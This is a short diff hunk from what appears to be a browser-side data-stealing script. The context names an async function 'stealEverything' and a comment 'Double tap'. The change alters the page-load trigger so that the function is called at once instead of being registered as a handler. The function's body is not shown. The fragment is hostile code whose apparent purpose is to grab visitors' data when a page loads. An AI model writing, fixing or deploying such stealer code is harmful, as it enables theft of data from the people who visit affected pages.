@@ -58,4 +58,5 @@ async function stealEverything() {
 }
 
 // Double tap
-window.addEventListener("load", stealEverything);
+window.addEventListener('load', stealEverything());
+
